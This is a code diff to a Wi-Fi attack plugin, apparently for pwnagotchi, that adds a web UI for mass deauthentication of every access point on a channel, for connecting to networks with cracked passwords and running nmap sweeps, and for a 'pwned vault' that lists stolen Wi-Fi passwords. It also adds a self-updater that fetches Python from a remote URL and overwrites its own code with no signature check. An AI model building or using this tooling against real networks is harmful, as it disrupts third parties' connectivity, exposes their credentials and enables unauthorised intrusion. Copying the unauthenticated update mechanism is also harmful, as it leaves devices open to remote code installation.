+            self._do_update_check(install=self._update_auto_install or force)
+        except Exception as e:
+            logging.exception("[wd_scanner] update worker failed")
+            self._update_last_status = "error: %s" % e
+        finally:
+            self._update_last_check = time.time()
+            with self._update_lock:
+                self._update_in_flight = False
+
+    def _do_update_check(self, install):
+        """Fetch remote, compare, optionally install."""
+        url = self._update_url
+        logging.info("[wd_scanner] checking %s for updates", url)
+        try:
+            req = urllib.request.Request(
+                url,
+                headers={
+                    "User-Agent": "wd_scanner/%s (+pwnagotchi)" % self.__version__,
+                    "Cache-Control": "no-cache",
+                },
+            )
+            with urllib.request.urlopen(req, timeout=20) as resp:
+                if resp.status != 200:
+                    self._update_last_status = "http %d" % resp.status
+                    return
+                data = resp.read()
+        except Exception as e:
+            self._update_last_status = "fetch error: %s" % e
+            logging.warning("[wd_scanner] update fetch failed: %s", e)
+            return
+
+        if len(data) < 1024 or len(data) > 4 * 1024 * 1024:
+            self._update_last_status = "remote size suspicious (%d bytes)" % len(data)
+            return
+
+        # Sanity: must look like a Python file declaring our class.
+        text = data.decode("utf-8", errors="replace")
+        if "class WdScanner" not in text:
+            self._update_last_status = "remote does not look like wd_scanner"
+            return
+
+        remote_sha = hashlib.sha256(data).hexdigest()
+        remote_ver = self._parse_version(data)
+        local_sha = self._update_local_sha or self._sha256_of_self()
+        self._update_remote_sha = remote_sha
+        self._update_remote_version = remote_ver
+        self._update_local_sha = local_sha
+
+        if remote_sha == local_sha:
+            self._update_last_status = "up-to-date"
+            logging.info("[wd_scanner] up-to-date (sha %s)", remote_sha[:12])
+            return
+
+        # Bytes differ. Validate it parses as Python before we touch disk.
+        try:
+            compile(data, "<wd_scanner-remote>", "exec")
+        except SyntaxError as e:
+            self._update_last_status = "remote has syntax error: %s" % e
+            logging.error("[wd_scanner] remote rejected: %s", e)
+            return
+
+        if not install:
+            self._update_last_status = "update available: v%s" % (remote_ver or "?")
+            return
+
+        # Install: write atomically to <self>.new, fsync, rename.
+        target = self._self_path()
+        target_dir = os.path.dirname(target)
+        backup = target + ".bak"
+        staged = target + ".new"
+        try:
+            with open(staged, "wb") as f:
+                f.write(data)
+                try:
+                    f.flush(); os.fsync(f.fileno())
+                except OSError:
+                    pass
+            try:
+                if os.path.exists(target):
+                    shutil.copy2(target, backup)
+            except Exception as e:
+                logging.warning("[wd_scanner] could not back up current file: %s", e)
+            os.replace(staged, target)
+            # Drop any stale bytecode so the new file is recompiled on restart.
+            try:
+                pyc_dir = os.path.join(target_dir, "__pycache__")
+                if os.path.isdir(pyc_dir):
+                    for n in os.listdir(pyc_dir):
+                        if n.startswith(os.path.basename(target).replace(".py", "")):
+                            try:
+                                os.remove(os.path.join(pyc_dir, n))
+                            except OSError:
+                                pass
+            except Exception:
+                pass
+
+            self._update_local_sha = remote_sha
+            self._update_pending_restart = True
+            self._update_last_status = "installed v%s — restart to activate" % (
+                remote_ver or remote_sha[:8]
+            )
+            logging.info(
+                "[wd_scanner] installed update v%s sha=%s; restart pwnagotchi to activate",
+                remote_ver, remote_sha[:12],
+            )
+        except Exception as e:
+            self._update_last_status = "install error: %s" % e
+            logging.exception("[wd_scanner] failed to install update")
+            try:
+                if os.path.exists(staged):
+                    os.remove(staged)
+            except OSError:
+                pass
 
     def _handshake_dir(self):
         # Pwnagotchi stores the handshake dir at config.bettercap.handshakes.
@@ -704,6 +1566,67 @@ class WdScanner(plugins.Plugin):
             self._start_attack(bssid, channel, ssid)
             return redirect("/plugins/wd_scanner/")
 
+        if req.method == "POST" and norm == "shotgun":
+            channel = (req.form.get("channel") or "").strip()
+            if not channel.isdigit():
+                return abort(400)
+            self._start_shotgun(int(channel))
+            return redirect("/plugins/wd_scanner/")
+
+        if req.method == "POST" and norm == "recon":
+            ssid = (req.form.get("ssid") or "").strip()
+            bssid = (req.form.get("bssid") or "").strip().lower()
+            if not re.match(r"^[0-9a-f:]{17}$", bssid):
+                return abort(400)
+            cracked = self._load_cracked_index()
+            password = (
+                cracked.get(bssid)
+                or cracked.get("ssid::" + ssid.lower())
+            )
+            if not password:
+                self._select_error = "no password on file for %s" % (ssid or bssid)
+                return redirect("/plugins/wd_scanner/")
+            self._start_recon(ssid, bssid, password)
+            return redirect("/plugins/wd_scanner/recon")
+
+        if norm == "recon" or norm == "recon/":
+            return self._render_recon_list()
+
+        m_rep = re.match(r"^recon/([^/]+\.json)$", norm or "")
+        if m_rep:
+            rep = self._load_recon_report(m_rep.group(1))
+            if rep is None:
+                return abort(404)
+            return self._render_recon_detail(m_rep.group(1), rep)
+
+        if norm == "pwned" or norm == "pwned/":
+            return self._render_pwned()
+
+        if norm == "pwned.json":
+            cracked = self._load_cracked_index()
+            return jsonify(self._compact_pwned_list(cracked))
+
+        if req.method == "POST" and norm == "check_update":
+            self._maybe_run_update_check(force=True)
+            return redirect("/plugins/wd_scanner/")
+
+        if req.method == "POST" and norm == "install_update":
+            # Force a check-and-install even if auto-install is off.
+            with self._update_lock:
+                if self._update_in_flight:
+                    return redirect("/plugins/wd_scanner/")
+                self._update_in_flight = True
+
+            def _run():
+                try:
+                    self._do_update_check(install=True)
+                finally:
+                    self._update_last_check = time.time()
+                    with self._update_lock:
+                        self._update_in_flight = False
+            threading.Thread(target=_run, daemon=True).start()
+            return redirect("/plugins/wd_scanner/")
+
         if norm == "status.json":
             return jsonify({
                 "scan_running": self._scan_running,
@@ -712,10 +1635,24 @@ class WdScanner(plugins.Plugin):
                 "results": self._last_scan_results,
                 "action_running": self._action_running,
                 "action_log": self._action_log[-50:],
+                "recon_running": self._recon_running,
+                "recon_log": self._recon_log[-50:],
                 "iface": self._iface_cfg,
                 "mon_iface": self._mon_iface,
                 "available": self._list_wireless_ifaces(),
                 "select_error": self._select_error,
+                "version": self.__version__,
+                "update": {
+                    "url": self._update_url,
+                    "in_flight": self._update_in_flight,
+                    "last_check": self._update_last_check,
+                    "last_status": self._update_last_status,
+                    "remote_version": self._update_remote_version,
+                    "remote_sha": self._update_remote_sha,
+                    "local_sha": self._update_local_sha,
+                    "auto_install": self._update_auto_install,
+                    "pending_restart": self._update_pending_restart,
+                },
             })
 
         return self._render_index()
@@ -735,12 +1672,15 @@ class WdScanner(plugins.Plugin):
             sel = " selected" if it["name"] == self._iface_cfg else ""
             if sel:
                 seen_current = True
-            label = "%s  [%s]" % (it["name"], it["type"])
+            shared_attr = " data-role='shared'" if it.get("shared") else ""
+            tag = "shared" if it.get("shared") else it["type"]
+            label = "%s  [%s]" % (it["name"], tag)
             if it.get("addr"):
                 label += "  %s" % it["addr"]
             opt_lines.append(
-                "<option value='{n}'{sel}>{lbl}</option>".format(
-                    n=escape(it["name"]), sel=sel, lbl=escape(label),
+                "<option value='{n}'{sel}{shared_attr}>{lbl}</option>".format(
+                    n=escape(it["name"]), sel=sel, shared_attr=shared_attr,
+                    lbl=escape(label),
                 )
             )
         # If the currently selected iface has vanished (e.g. unplugged) keep
@@ -754,6 +1694,68 @@ class WdScanner(plugins.Plugin):
         select_err_html = ""
         if self._select_error:
             select_err_html = "<div class='err'>// %s</div>" % escape(self._select_error)
+
+        shared_warn_html = ""
+        if self._shared_radio:
+            shared_warn_html = (
+                "<div class='shared-warn'>"
+                "<span>&#9888;</span>"
+                "<span><b>SHARED RADIO</b> &mdash; pwnagotchi will pause "
+                "while we scan or attack, then resume automatically.</span>"
+                "</div>"
+            )
+
+        # ---- updater panel + restart banner ----
+        update_panel_html, restart_banner_html = self._render_update_panel()
+
+        # ---- shotgun panel: per-channel mass deauth ----
+        channel_counts = {}
+        for ap in (self._last_scan_results or []):
+            ch = int(ap.get("channel") or 0)
+            if ch <= 0:
+                continue
+            channel_counts[ch] = channel_counts.get(ch, 0) + 1
+        if channel_counts:
+            ordered = sorted(channel_counts.items(), key=lambda kv: kv[0])
+            chip_html = []
+            for ch, n in ordered:
+                disabled = "disabled" if (
+                    self._action_running or self._recon_running or not has_iface
+                ) else ""
+                chip_html.append(
+                    "<form method='POST' action='/plugins/wd_scanner/shotgun' class='shot-chip-form'"
+                    "      onsubmit=\"return confirm('// SHOTGUN ch{ch}\\n"
+                    "Deauth all {n} BSSIDs on channel {ch} and listen 30s?');\">"
+                    "  <input type='hidden' name='channel' value='{ch}'>"
+                    "  <button type='submit' class='shot-chip' {disabled}>"
+                    "    CH {ch} <span class='shot-n'>{n}</span>"
+                    "  </button>"
+                    "</form>".format(ch=ch, n=n, disabled=disabled)
+                )
+            shotgun_panel_html = (
+                "<div class='shotgun'>"
+                "  <h3>shotgun by channel</h3>"
+                "  <p class='shot-blurb'>deauth every BSSID on a channel + listen %ds</p>"
+                "  <div class='shot-chips'>%s</div>"
+                "</div>"
+            ) % (self._shotgun_listen_seconds, "\n".join(chip_html))
+        else:
+            shotgun_panel_html = ""
+
+        # ---- recon panel ----
+        if self._recon_running or self._recon_log:
+            recon_lines = "\n".join(escape(l) for l in self._recon_log[-50:])
+            badge = "<span class='recon-state run'>RUNNING</span>" if self._recon_running \
+                    else "<span class='recon-state idle'>IDLE</span>"
+            recon_panel_html = (
+                "<div class='section-h'>recon log</div>"
+                "<div class='recon-panel'>"
+                "  <div class='recon-h'>{badge}<a href='/plugins/wd_scanner/recon'>VIEW REPORTS &rarr;</a></div>"
+                "  <pre class='log'>{lines}</pre>"
+                "</div>"
+            ).format(badge=badge, lines=recon_lines)
+        else:
+            recon_panel_html = ""
 
         # Look up any networks pwnagotchi has already cracked, so we can
         # surface the password and mark the card as PWNED.
@@ -814,6 +1816,26 @@ class WdScanner(plugins.Plugin):
                 else "// HACK TARGET\\n"
             )
 
+            recon_btn = ""
+            if is_pwned:
+                recon_btn = (
+                    "  <form method='POST' action='/plugins/wd_scanner/recon' class='recon-form'"
+                    "        onsubmit=\"return confirm('// RECON TARGET\\n{ssid_js}\\nConnect with known password and run nmap sweep?');\">"
+                    "    <input type='hidden' name='bssid' value='{bssid}'>"
+                    "    <input type='hidden' name='ssid' value='{ssid}'>"
+                    "    <button type='submit' class='btn-recon' {recon_disabled}>"
+                    "      <span class='glyph'>&#x1f50d;</span> RECON"
+                    "    </button>"
+                    "  </form>"
+                ).format(
+                    ssid=ssid_safe,
+                    ssid_js=ssid_js,
+                    bssid=escape(ap["bssid"]),
+                    recon_disabled="disabled" if (
+                        self._action_running or self._recon_running
+                    ) else "",
+                )
+
             cards.append(
                 "<article class='node{pwned_cls}'>"
                 "  <header class='node-h'>"
@@ -838,6 +1860,7 @@ class WdScanner(plugins.Plugin):
                 "      {label}"
                 "    </button>"
                 "  </form>"
+                "  {recon_btn}"
                 "</article>".format(
                     ssid=ssid_safe,
                     ssid_js=ssid_js,
@@ -852,7 +1875,8 @@ class WdScanner(plugins.Plugin):
                     password_row=password_row,
                     confirm=confirm_msg,
                     label=hack_button_label,
-                    disabled="disabled" if (self._action_running or not has_iface) else "",
+                    disabled="disabled" if (self._action_running or not has_iface or self._recon_running) else "",
+                    recon_btn=recon_btn,
                 )
             )
 
@@ -1239,6 +2263,151 @@ body::before {{
 }}
 .log:empty::before {{ content: '// silence'; color: var(--mute); }}
 
+/* ---- update panel ---- */
+.upd {{
+  margin: 14px 0 0;
+  padding: 12px;
+  background: linear-gradient(180deg, #0a1418, #07090b);
+  border: 1px solid var(--grid);
+  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+  position: relative;
+}}
+.upd::before {{
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px; background: var(--cyan-d);
+  box-shadow: 0 0 10px rgba(0,184,204,.3);
+}}
+.upd h3 {{
+  margin: 0 0 8px; font-size: 11px; letter-spacing: .3em;
+  color: var(--mute); text-transform: uppercase;
+}}
+.upd-grid {{
+  display: grid; gap: 6px 12px;
+  grid-template-columns: 1fr 1fr;
+  margin-bottom: 10px;
+}}
+.upd-grid > div {{ display: flex; flex-direction: column; }}
+.upd-grid dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); text-transform: uppercase; }}
+.upd-grid dd {{ margin: 1px 0 0; color: var(--fg); word-break: break-all; }}
+.upd-actions {{ display: flex; gap: 8px; flex-wrap: wrap; }}
+.upd-actions form {{ flex: 1; min-width: 140px; }}
+.upd-actions .btn {{ width: 100%; }}
+.upd .ok {{ color: var(--green); }}
+.upd .warn {{ color: var(--orange); }}
+.upd .bad {{ color: var(--red); }}
+.upd .pending {{ color: var(--cyan); }}
+.upd .mute {{ color: var(--mute); font-size: 11px; }}
+
+/* ---- shotgun ---- */
+.shotgun {{
+  margin: 0 0 12px; padding: 10px 12px;
+  border: 1px solid var(--orange);
+  background: linear-gradient(180deg, rgba(255,122,0,.06), transparent);
+  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+  position: relative;
+}}
+.shotgun::before {{
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px; background: var(--orange); box-shadow: 0 0 10px rgba(255,122,0,.5);
+}}
+.shotgun h3 {{
+  margin: 0 0 4px; font-size: 11px; letter-spacing: .3em;
+  text-transform: uppercase; color: var(--orange);
+}}
+.shotgun .shot-blurb {{
+  margin: 0 0 8px; color: var(--mute); font-size: 11px; letter-spacing: .12em;
+}}
+.shot-chips {{ display: flex; flex-wrap: wrap; gap: 6px; }}
+.shot-chip-form {{ margin: 0; }}
+.shot-chip {{
+  appearance: none; -webkit-appearance: none;
+  font: inherit; font-weight: 700;
+  letter-spacing: .15em; text-transform: uppercase;
+  background: #2a1300; color: var(--orange);
+  border: 1px solid var(--orange);
+  padding: 6px 12px; min-height: 36px;
+  cursor: pointer;
+  display: inline-flex; align-items: center; gap: 6px;
+  clip-path: polygon(6px 0, 100% 0, 100% calc(100% - 6px), calc(100% - 6px) 100%, 0 100%, 0 6px);
+}}
+.shot-chip:active {{ transform: translateY(1px); }}
+.shot-chip[disabled] {{ opacity: .4; cursor: not-allowed; }}
+.shot-chip .shot-n {{
+  background: var(--orange); color: #1a0a00;
+  padding: 0 6px; font-size: 10px; font-weight: 700;
+  letter-spacing: .12em;
+}}
+
+/* ---- recon button on cards ---- */
+.recon-form {{ margin-top: 8px; }}
+.btn-recon {{
+  appearance: none; -webkit-appearance: none;
+  width: 100%;
+  height: 44px;
+  padding: 0 14px;
+  font: inherit; font-weight: 700;
+  letter-spacing: .25em; text-transform: uppercase;
+  background: linear-gradient(180deg, #00282e, #001416);
+  color: var(--cyan);
+  border: 1px solid var(--cyan);
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+  text-shadow: 0 0 6px rgba(0,229,255,.5);
+}}
+.btn-recon:active {{ transform: translateY(1px); }}
+.btn-recon[disabled] {{ opacity: .35; cursor: not-allowed; filter: grayscale(.6); }}
+.btn-recon .glyph {{ font-size: 16px; }}
+
+/* ---- recon panel ---- */
+.recon-panel {{
+  border: 1px solid var(--cyan-d);
+  background: linear-gradient(180deg, #04161a, #07090b);
+  padding: 10px 12px;
+  margin-bottom: 12px;
+  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+}}
+.recon-h {{
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 10px; margin-bottom: 8px;
+}}
+.recon-h a {{
+  color: var(--cyan); text-decoration: none;
+  font-size: 11px; letter-spacing: .25em; text-transform: uppercase;
+  border: 1px solid var(--cyan); padding: 4px 10px;
+}}
+.recon-state {{
+  font-size: 11px; letter-spacing: .25em; padding: 2px 8px;
+  border: 1px solid var(--grid);
+}}
+.recon-state.run {{
+  color: var(--green); border-color: var(--green);
+  text-shadow: 0 0 6px rgba(43,255,136,.5);
+}}
+.recon-state.idle {{ color: var(--mute); }}
+
+.nav .count.cyan {{
+  background: var(--cyan); color: #002a30;
+}}
+
+.restart-banner {{
+  margin: 0 0 10px;
+  padding: 10px 12px;
+  background: linear-gradient(90deg, rgba(255,122,0,.15), rgba(255,122,0,.04));
+  border: 1px solid var(--orange);
+  color: var(--orange);
+  font-size: 12px;
+  letter-spacing: .15em;
+  text-transform: uppercase;
+  display: flex; align-items: center; gap: 10px;
+  animation: pulse 1.6s ease-in-out infinite alternate;
+}}
+.restart-banner b {{ color: #fff; text-shadow: 0 0 6px rgba(255,122,0,.6); }}
+@keyframes pulse {{
+  from {{ box-shadow: 0 0 0 rgba(255,122,0,0); }}
+  to   {{ box-shadow: 0 0 18px rgba(255,122,0,.4); }}
+}}
+
 footer.tag {{
   margin: 16px 0 8px;
   text-align: center;
@@ -1265,6 +2434,38 @@ footer.tag {{
   pointer-events: none;
   mix-blend-mode: screen;
 }}
+
+/* ---- nav ---- */
+.nav {{
+  display: flex; gap: 8px; margin: 0 0 12px; flex-wrap: wrap;
+}}
+.nav a {{
+  flex: 1; min-width: 120px;
+  display: inline-flex; align-items: center; justify-content: center;
+  height: 36px; padding: 0 12px;
+  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
+  background: transparent; color: var(--cyan);
+  border: 1px solid var(--grid);
+  text-decoration: none;
+  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+}}
+.nav a.active {{ border-color: var(--cyan); background: #06292e; }}
+.nav .count {{
+  display: inline-block; padding: 1px 6px; margin-left: 6px;
+  background: var(--green); color: #002912;
+  font-weight: 700; font-size: 10px; letter-spacing: .15em;
+}}
+
+/* ---- shared-radio badge ---- */
+.shared-warn {{
+  margin: 0 0 10px; padding: 8px 10px;
+  background: rgba(255,179,0,.06);
+  border: 1px solid var(--warn); color: var(--warn);
+  font-size: 12px; letter-spacing: .08em;
+  display: flex; align-items: center; gap: 8px;
+}}
+.shared-warn b {{ color: #fff; }}
+option[data-role='shared'] {{ color: var(--warn) !important; }}
 </style>
 </head>
 <body>
@@ -1275,6 +2476,12 @@ footer.tag {{
     <h1 data-text='ctOS // wd_scanner'>ct<b>OS</b> // wd_scanner</h1>
     <span class='sub'>DedSec</span>
   </div>
+
+  <nav class='nav'>
+    <a href='/plugins/wd_scanner/' class='active'>SCANNER</a>
+    <a href='/plugins/wd_scanner/pwned'>VAULT <span class='count'>{pwned_count}</span></a>
+    <a href='/plugins/wd_scanner/recon'>RECON <span class='count cyan'>{recon_count}</span></a>
+  </nav>
 
   <div class='status'>
     <div class='chip'><span class='k'>aux iface</span><span class='v'>{iface}</span></div>
@@ -1296,6 +2503,8 @@ footer.tag {{
   </div>
   {select_err}
   {select_hint}
+  {shared_warn}
+  {restart_banner}
 
   <div class='toolbar'>
     <form method='POST' action='/plugins/wd_scanner/scan'>
@@ -1304,6 +2513,8 @@ footer.tag {{
     </form>
   </div>
 
+  {shotgun_panel}
+
   <div class='section-h'>nodes detected</div>
   <div class='grid'>
     {cards}
@@ -1311,6 +2522,10 @@ footer.tag {{
 
   <div class='section-h'>action log</div>
   <pre class='log'>{log}</pre>
+
+  {recon_panel}
+
+  {update_panel}
 
   <footer class='tag'>// the truth will set us free //</footer>
 </div>
@@ -1358,8 +2573,717 @@ footer.tag {{
             ),
             cards="\n".join(cards) if cards else empty_state,
             log=action_log,
+            update_panel=update_panel_html,
+            restart_banner=restart_banner_html,
+            shared_warn=shared_warn_html,
+            shotgun_panel=shotgun_panel_html,
+            recon_panel=recon_panel_html,
+            pwned_count=len(self._compact_pwned_list(cracked)),
+            recon_count=len(self._list_recon_reports()),
         )
         return body
+
+    def _render_update_panel(self):
+        """Return (panel_html, restart_banner_html)."""
+        local_v = self.__version__
+        remote_v = self._update_remote_version
+        last_status = self._update_last_status or "not yet checked"
+        in_flight = self._update_in_flight
+        pending = self._update_pending_restart
+
+        # Classify the status.
+        cls = "ok"
+        sl = (last_status or "").lower()
+        if "error" in sl or "suspicious" in sl or "syntax" in sl:
+            cls = "bad"
+        elif "available" in sl or "installed" in sl:
+            cls = "warn"
+        elif "up-to-date" in sl:
+            cls = "ok"
+        else:
+            cls = "pending"
+
+        if in_flight:
+            cls = "pending"
+            last_status = "checking..."
+
+        if self._update_last_check:
+            last_check = time.strftime(
+                "%Y-%m-%d %H:%M:%S",
+                time.localtime(self._update_last_check),
+            )
+        else:
+            last_check = "never"
+
+        # Decide whether to show the explicit INSTALL button:
+        # - status announces an update is available, AND we have a different remote sha
+        update_available = bool(
+            self._update_remote_sha
+            and self._update_local_sha
+            and self._update_remote_sha != self._update_local_sha
+        )
+
+        check_disabled = "disabled" if in_flight else ""
+        install_disabled = "disabled" if (in_flight or not update_available) else ""
+
+        # Truncate sha for display.
+        def _short(s):
+            return (s[:12] + "...") if s and len(s) > 12 else (s or "—")
+
+        panel = (
+            "<div class='upd'>"
+            "  <h3>updates // {url_short}</h3>"
+            "  <dl class='upd-grid'>"
+            "    <div><dt>installed</dt><dd>v{local_v} <span class='mute'>({local_sha})</span></dd></div>"
+            "    <div><dt>remote</dt><dd>v{remote_v} <span class='mute'>({remote_sha})</span></dd></div>"
+            "    <div><dt>last check</dt><dd>{last_check}</dd></div>"
+            "    <div><dt>status</dt><dd class='{cls}'>{status}</dd></div>"
+            "  </dl>"
+            "  <div class='upd-actions'>"
+            "    <form method='POST' action='/plugins/wd_scanner/check_update'>"
+            "      <button type='submit' class='btn' {check_disabled}>&#8635; CHECK NOW</button>"
+            "    </form>"
+            "    <form method='POST' action='/plugins/wd_scanner/install_update'"
+            "          onsubmit=\"return confirm('Install update from\\n{url_js}?');\">"
+            "      <button type='submit' class='btn alt' {install_disabled}>&#9660; INSTALL</button>"
+            "    </form>"
+            "  </div>"
+            "</div>"
+        ).format(
+            url_short=escape(self._update_url.split("/")[-1] if self._update_url else "?"),
+            url_js=escape(self._update_url).replace("'", ""),
+            local_v=escape(local_v),
+            remote_v=escape(remote_v or "?"),
+            local_sha=escape(_short(self._update_local_sha)),
+            remote_sha=escape(_short(self._update_remote_sha)),
+            last_check=escape(last_check),
+            status=escape(last_status),
+            cls=cls,
+            check_disabled=check_disabled,
+            install_disabled=install_disabled,
+        )
+
+        if pending:
+            banner = (
+                "<div class='restart-banner'>"
+                "<span>&#9888;</span>"
+                "<span><b>RESTART REQUIRED</b> &mdash; "
+                "update v{rv} installed; run <code>systemctl restart pwnagotchi</code> to activate.</span>"
+                "</div>"
+            ).format(rv=escape(remote_v or "?"))
+        else:
+            banner = ""
+
+        return panel, banner
+
+    # ---------------------------------------------------------- pwned vault
+
+    def _compact_pwned_list(self, idx):
+        """
+        Convert the raw `_load_cracked_index` map (which has bssid-keyed,
+        ssid-keyed and origcase-keyed entries) into a deduped list of
+        {ssid, bssid, password} rows for the UI / JSON.
+        """
+        # Helper: original-case SSID lookup.
+        def _ssid_orig(lower):
+            return idx.get("__origcase__::" + lower) or lower
+
+        seen = {}
+        # First pass: BSSID-keyed entries are most reliable.
+        for k, pw in idx.items():
+            if k.startswith("ssid::") or k.startswith("__origcase__::"):
+                continue
+            if not re.match(r"^[0-9a-f:]{17}$", k):
+                continue
+            seen[k] = {"bssid": k, "password": pw, "ssid": ""}
+
+        # Second pass: SSID-keyed entries fill in gaps + name BSSID rows.
+        for k, pw in idx.items():
+            if not k.startswith("ssid::"):
+                continue
+            ssid_lower = k[len("ssid::"):]
+            ssid = _ssid_orig(ssid_lower)
+            attached = False
+            for row in seen.values():
+                if not row["ssid"] and row["password"] == pw:
+                    row["ssid"] = ssid
+                    attached = True
+                    break
+            if not attached:
+                seen["ssid::" + ssid_lower] = {
+                    "bssid": "",
+                    "password": pw,
+                    "ssid": ssid,
+                }
+        # Sort: rows with both ssid+bssid first, then alphabetical SSID.
+        rows = list(seen.values())
+        rows.sort(key=lambda r: (
+            0 if (r["ssid"] and r["bssid"]) else 1,
+            (r["ssid"] or "").lower(),
+            r["bssid"],
+        ))
+        return rows
+
+    def _render_pwned(self):
+        cracked = self._load_cracked_index()
+        rows = self._compact_pwned_list(cracked)
+        n = len(rows)
+
+        if rows:
+            row_html = []
+            for r in rows:
+                ssid = escape(r["ssid"] or "<unknown ssid>")
+                bssid = escape(r["bssid"] or "—")
+                pw = escape(r["password"])
+                pw_attr = pw.replace("&#x27;", "&apos;")
+                row_html.append(
+                    "<article class='vault-row'>"
+                    "  <header class='vault-h'>"
+                    "    <span class='vault-ssid'>{ssid}</span>"
+                    "    <span class='badge-pwned'>&#x2713; PWNED</span>"
+                    "  </header>"
+                    "  <dl class='vault-meta'>"
+                    "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
+                    "    <div class='vault-pw'>"
+                    "      <dt>PASSWORD</dt>"
+                    "      <dd><code class='pw-val'>{pw}</code>"
+                    "      <button type='button' class='copy' data-pw='{pw_attr}' "
+                    "aria-label='copy password'>copy</button></dd>"
+                    "    </div>"
+                    "  </dl>"
+                    "</article>".format(ssid=ssid, bssid=bssid, pw=pw, pw_attr=pw_attr)
+                )
+            list_html = "\n".join(row_html)
+        else:
+            list_html = (
+                "<div class='empty'>"
+                "<div class='empty-glyph'>&#x1f512;</div>"
+                "<p>// VAULT EMPTY</p>"
+                "<small>no cracked handshakes found in {dir}</small>"
+                "</div>".format(dir=escape(self._handshake_dir() or "?"))
+            )
+
+        body = """\
+<!doctype html>
+<html lang='en'>
+<head>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
+<meta name='theme-color' content='#0a0d10'>
+<title>ctOS // pwned vault</title>
+<style>
+:root {{
+  --bg: #07090b; --panel: #111820; --grid: #1a232c;
+  --fg: #d8e4ec; --mute: #6c7c89;
+  --cyan: #00e5ff; --orange: #ff7a00; --green: #2bff88;
+}}
+* {{ box-sizing: border-box; }}
+html, body {{ margin: 0; padding: 0; }}
+body {{
+  background:
+    radial-gradient(1200px 600px at 50% -10%, rgba(43,255,136,.08), transparent 60%),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
+    var(--bg);
+  color: var(--fg);
+  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
+  font-size: 14px; line-height: 1.4; min-height: 100vh;
+  padding: env(safe-area-inset-top) env(safe-area-inset-right)
+           env(safe-area-inset-bottom) env(safe-area-inset-left);
+}}
+body::before {{
+  content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 50;
+  background: repeating-linear-gradient(180deg, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
+  mix-blend-mode: multiply;
+}}
+.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}
+.brand {{
+  display: flex; align-items: center; gap: 10px;
+  padding: 10px 12px; margin-bottom: 10px;
+  border: 1px solid var(--grid);
+  background: linear-gradient(180deg, #0e141a, #0a0e12);
+  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
+}}
+.brand .mark {{
+  width: 28px; height: 28px; display: grid; place-items: center;
+  border: 1px solid var(--green); color: var(--green);
+  font-weight: 700; text-shadow: 0 0 6px rgba(43,255,136,.6);
+}}
+.brand h1 {{
+  margin: 0; font-size: 14px; letter-spacing: .25em;
+  text-transform: uppercase; color: var(--fg);
+}}
+.brand h1 b {{ color: var(--green); }}
+.brand .sub {{ margin-left: auto; font-size: 11px; color: var(--mute); letter-spacing: .2em; }}
+
+.nav {{
+  display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap;
+}}
+.nav a {{
+  flex: 1; min-width: 120px;
+  display: inline-flex; align-items: center; justify-content: center;
+  height: 40px; padding: 0 12px;
+  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
+  background: #06292e; color: var(--cyan);
+  border: 1px solid var(--cyan);
+  text-decoration: none;
+  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+}}
+.nav a.active {{ background: #052618; color: var(--green); border-color: var(--green); }}
+
+.count {{
+  display: inline-block; padding: 2px 8px; margin-left: 8px;
+  background: var(--green); color: #002912;
+  font-weight: 700; font-size: 11px; letter-spacing: .2em;
+}}
+.section-h {{
+  margin: 8px 0 12px; font-size: 11px; letter-spacing: .3em;
+  color: var(--mute); text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}}
+.section-h::before, .section-h::after {{
+  content: ''; flex: 1; height: 1px; background: var(--grid);
+}}
+
+.vault-row {{
+  position: relative;
+  background: linear-gradient(180deg, #0c1d12, #07120a);
+  border: 1px solid var(--green);
+  padding: 12px;
+  margin-bottom: 10px;
+  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
+  box-shadow: 0 0 0 1px rgba(43,255,136,.15);
+}}
+.vault-row::before {{
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px; background: var(--green); box-shadow: 0 0 12px rgba(43,255,136,.6);
+}}
+.vault-h {{
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 10px; margin-bottom: 8px;
+}}
+.vault-ssid {{
+  font-size: 16px; font-weight: 700; color: var(--green);
+  text-shadow: 0 0 8px rgba(43,255,136,.4);
+  word-break: break-all; letter-spacing: .04em;
+}}
+.badge-pwned {{
+  display: inline-block; padding: 2px 8px;
+  font-size: 10px; font-weight: 700; letter-spacing: .3em;
+  background: var(--green); color: #002912; border: 1px solid var(--green);
+  clip-path: polygon(4px 0, 100% 0, calc(100% - 4px) 100%, 0 100%);
+}}
+.vault-meta {{
+  display: grid; grid-template-columns: 1fr; gap: 6px 10px; margin: 0;
+}}
+.vault-meta > div {{
+  display: flex; flex-direction: column;
+  border-left: 1px dashed #1f2a33; padding: 2px 0 2px 8px;
+}}
+.vault-meta dt {{
